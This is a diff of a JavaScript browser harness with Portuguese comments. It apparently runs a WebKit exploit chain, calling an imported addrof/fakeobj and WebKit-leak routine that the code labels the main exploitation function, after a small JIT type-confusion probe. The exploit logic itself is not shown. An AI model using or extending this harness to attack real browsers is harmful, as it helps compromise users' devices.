@@ -3,9 +3,10 @@
 import {
     executeTypedArrayVictimAddrofAndWebKitLeak_R43,
     FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT
+    // Removido: testIsolatedAddrofFakeobjCoreAndDump_from_script3 não é mais exportado
 } from './script3/testArrayBufferVictimCrash.mjs';
-import { AdvancedInt64, setLogFunction, toHex, isAdvancedInt64Object } from './utils.mjs'; //
-import { JSC_OFFSETS } from './config.mjs'; //
+import { AdvancedInt64, setLogFunction, toHex, isAdvancedInt64Object } from './utils.mjs';
+import { JSC_OFFSETS } from './config.mjs';
 
 
 // --- Local DOM Elements Management ---
@@ -22,132 +23,132 @@ function getElementById(id) {
     return element;
 }
 
-// --- Contador de Testes Global ---
-let testCounter = 0; //
-
 // --- Local Logging Functionality ---
 const outputDivId = 'output-advanced';
 
 export const log = (message, type = 'info', funcName = '') => {
-    const outputDiv = getElementById(outputDivId); //
-    if (!outputDiv) { //
-        console.error(`Log target div "${outputDivId}" not found. Message: ${message}`); //
-        return; //
+    const outputDiv = getElementById(outputDivId);
+    if (!outputDiv) {
+        console.error(`Log target div "${outputDivId}" not found. Message: ${message}`);
+        return;
     }
     try {
-        const timestamp = `[${new Date().toLocaleTimeString()}]`; //
-        let prefix = funcName ? `[${funcName}] ` : ''; //
+        const timestamp = `[${new Date().toLocaleTimeString()}]`;
+        const prefix = funcName ? `[${funcName}] ` : '';
+        const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
+        const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation', 'tool', 'debug'].includes(type) ? type : 'info';
 
-        // Adicionar o contador de testes se for o início de um novo teste principal
-        if (message.includes("--- Iniciando Teste de Comportamento do JIT ---") || message.includes("--- Iniciando Full_UAF_ASLR_ARBRW_v152_AGRESSIVO:")) { //
-            testCounter++; //
-            prefix = `[TEST ${testCounter}] ` + prefix; //
+        if (outputDiv.innerHTML.length > 600000) {
+            const lastPart = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 300000);
+            outputDiv.innerHTML = `<span class="log-info">[${new Date().toLocaleTimeString()}] [Log Truncado...]</span>\n` + lastPart;
         }
 
-
-        const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;"); //
-        const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation', 'tool', 'debug'].includes(type) ? type : 'info'; //
-
-        if (outputDiv.innerHTML.length > 600000) { //
-            const lastPart = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 300000); //
-            outputDiv.innerHTML = `<span class="log-info">[${new Date().toLocaleTimeString()}] [Log Truncado...]</span>\n` + lastPart; //
-        }
-
-        outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`; //
-        outputDiv.scrollTop = outputDiv.scrollHeight; //
+        outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`;
+        outputDiv.scrollTop = outputDiv.scrollHeight;
     } catch (e) {
-        console.error(`Error in logToDiv for ${outputDivId}:`, e, "Original message:", message); //
-        if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`; //
+        console.error(`Error in logToDiv for ${outputDivId}:`, e, "Original message:", message);
+        if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`;
     }
 };
 
 // --- Local Pause Functionality ---
-const SHORT_PAUSE = 50; //
-const MEDIUM_PAUSE = 500; //
-const LONG_PAUSE = 1000; //
+const SHORT_PAUSE = 50;
+const MEDIUM_PAUSE = 500;
+const LONG_PAUSE = 1000;
 
-const PAUSE = async (ms = SHORT_PAUSE) => { //
-    return new Promise(resolve => setTimeout(resolve, ms)); //
+const PAUSE = async (ms = SHORT_PAUSE) => {
+    return new Promise(resolve => setTimeout(resolve, ms));
 };
 
 // --- JIT Behavior Test ---
-async function testJITBehavior() { //
-    log("--- Iniciando Teste de Comportamento do JIT ---", 'test', 'testJITBehavior'); //
-    let test_buf = new ArrayBuffer(16); //
-    let float_view = new Float64Array(test_buf); //
-    let uint32_view = new Uint32Array(test_buf); //
-    let some_obj = { a: 1, b: 2 }; //
+async function testJITBehavior() {
+    log("--- Iniciando Teste de Comportamento do JIT ---", 'test', 'testJITBehavior');
+    let test_buf = new ArrayBuffer(16);
+    let float_view = new Float64Array(test_buf);
+    let uint32_view = new Uint32Array(test_buf);
+    let some_obj = { a: 1, b: 2 };
 
-    log("Escrevendo um objeto em um Float64Array...", 'info', 'testJITBehavior'); //
-    float_view[0] = some_obj; //
+    log("Escrevendo um objeto em um Float64Array...", 'info', 'testJITBehavior');
+    float_view[0] = some_obj;
 
-    const low = uint32_view[0]; //
-    const high = uint32_view[1]; //
-    const leaked_val = new AdvancedInt64(low, high); //
+    const low = uint32_view[0];
+    const high = uint32_view[1];
+    const leaked_val = new AdvancedInt64(low, high);
 
-    log(`Bits lidos: high=0x${high.toString(16)}, low=0x${low.toString(16)} (Valor completo: ${leaked_val.toString(true)})`, 'leak', 'testJITBehavior'); //
+    log(`Bits lidos: high=0x${high.toString(16)}, low=0x${low.toString(16)} (Valor completo: ${leaked_val.toString(true)})`, 'leak', 'testJITBehavior');
 
-    if (high === 0x7ff80000 && low === 0) { //
-        log("CONFIRMADO: O JIT converteu o objeto para NaN, como esperado.", 'good', 'testJITBehavior'); //
+    if (high === 0x7ff80000 && low === 0) {
+        log("CONFIRMADO: O JIT converteu o objeto para NaN, como esperado.", 'good', 'testJITBehavior');
     } else {
-        log("INESPERADO: O JIT não converteu para NaN. O comportamento é diferente do esperado.", 'warn', 'testJITBehavior'); //
+        log("INESPERADO: O JIT não converteu para NaN. O comportamento é diferente do esperado.", 'warn', 'testJITBehavior');
     }
-    log("--- Teste de Comportamento do JIT Concluído ---", 'test', 'testJITBehavior'); //
+    log("--- Teste de Comportamento do JIT Concluído ---", 'test', 'testJITBehavior');
 }
 
 
 // --- Initialization Logic ---
-function initializeAndRunTest() { //
-    const runBtn = getElementById('runIsolatedTestBtn'); //
-    const outputDiv = getElementById('output-advanced'); //
+function initializeAndRunTest() {
+    const runBtn = getElementById('runIsolatedTestBtn');
+    const outputDiv = getElementById('output-advanced');
 
     // Set the log function in utils.mjs so core_exploit.mjs can use it
-    setLogFunction(log); //
+    setLogFunction(log);
 
-    if (!outputDiv) { //
-        console.error("DIV 'output-advanced' not found. Log will not be displayed on the page."); //
+    if (!outputDiv) {
+        console.error("DIV 'output-advanced' not found. Log will not be displayed on the page.");
     }
 
-    if (runBtn) { //
-        runBtn.addEventListener('click', async () => { //
-            if (runBtn.disabled) return; //
-            runBtn.disabled = true; //
+    if (runBtn) {
+        runBtn.addEventListener('click', async () => {
+            if (runBtn.disabled) return;
+            runBtn.disabled = true;
 
-            if (outputDiv) { //
-                outputDiv.innerHTML = ''; // Clear previous logs //
+            if (outputDiv) {
+                outputDiv.innerHTML = ''; // Clear previous logs
             }
-            // Resetar o contador para cada nova execução do botão
-            testCounter = 0; //
-            console.log("Starting isolated test: Attempting to Reproduce Getter Trigger in MyComplexObject..."); //
-            log("Starting isolated test: Attempting to Reproduce Getter Trigger in MyComplexObject...", 'test'); //
+            console.log("Starting isolated test: Attempting to Reproduce Getter Trigger in MyComplexObject...");
+            log("Starting isolated test: Attempting to Reproduce Getter Trigger in MyComplexObject...", 'test');
 
             try {
                 // Execute JIT test first
-                await testJITBehavior(); //
-                await PAUSE(MEDIUM_PAUSE); // Pause to read JIT test log //
+                await testJITBehavior();
+                await PAUSE(MEDIUM_PAUSE); // Pause to read JIT test log
+
+                // Removido: testIsolatedAddrofFakeobjCoreAndDump_from_script3 não é mais um ponto de entrada.
+                // A lógica de validação de addrof/fakeobj agora está implícita se o exploit geral avançar.
+                /*
+                const addrof_fakeobj_dump_test_passed = await testIsolatedAddrofFakeobjCoreAndDump_from_script3(log, PAUSE, JSC_OFFSETS, isAdvancedInt64Object);
+                if (!addrof_fakeobj_dump_test_passed) {
+                    log("Teste isolado das primitivas addrof_core/fakeobj_core e dump de memória falhou. Isso é crítico para a exploração. Abortando a cadeia principal.", "critical");
+                    runBtn.disabled = false;
+                    return;
+                }
+                log("Teste isolado das primitivas addrof_core/fakeobj_core e dump de memória concluído com sucesso. Prosseguindo para a cadeia principal.", "good");
+                await PAUSE(LONG_PAUSE); // Pausa mais longa para revisar logs do dump
+                */
 
                 // CHAME A FUNÇÃO PRINCIPAL DE EXPLORAÇÃO INTEGRADA
-                await executeTypedArrayVictimAddrofAndWebKitLeak_R43(log, PAUSE, JSC_OFFSETS); //
+                await executeTypedArrayVictimAddrofAndWebKitLeak_R43(log, PAUSE, JSC_OFFSETS);
             } catch (e) {
-                console.error("Critical error during isolated test execution:", e); //
-                log(`[CRITICAL TEST ERROR] ${String(e.message).replace(/</g, "&lt;").replace(/>/g, "&gt;")}\n`, 'critical'); //
+                console.error("Critical error during isolated test execution:", e);
+                log(`[CRITICAL TEST ERROR] ${String(e.message).replace(/</g, "&lt;").replace(/>/g, "&gt;")}\n`, 'critical');
             } finally {
-                console.log("Isolated test concluded."); //
-                log("Isolated test finished. Check the console for more details, especially if the browser crashed or a RangeError occurred.\n", 'test'); //
-                runBtn.disabled = false; //
-                if (document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT) && !document.title.includes("SUCCESS") && !document.title.includes("Fail") && !document.title.includes("OK") && !document.title.includes("Confirmed")) { //
-                    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_Done`; //
+                console.log("Isolated test concluded.");
+                log("Isolated test finished. Check the console for more details, especially if the browser crashed or a RangeError occurred.\n", 'test');
+                runBtn.disabled = false;
+                if (document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT) && !document.title.includes("SUCCESS") && !document.title.includes("Fail") && !document.title.includes("OK") && !document.title.includes("Confirmed")) {
+                    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_Done`;
                 }
             }
         });
     } else {
-        console.error("Button 'runIsolatedTestBtn' not found."); //
+        console.error("Button 'runIsolatedTestBtn' not found.");
     }
 }
 
 // Ensure DOM is ready
-if (document.readyState === 'loading') { //
-    document.addEventListener('DOMContentLoaded', initializeAndRunTest); //
+if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initializeAndRunTest);
 } else {
-    initializeAndRunTest(); //
+    initializeAndRunTest();
 }
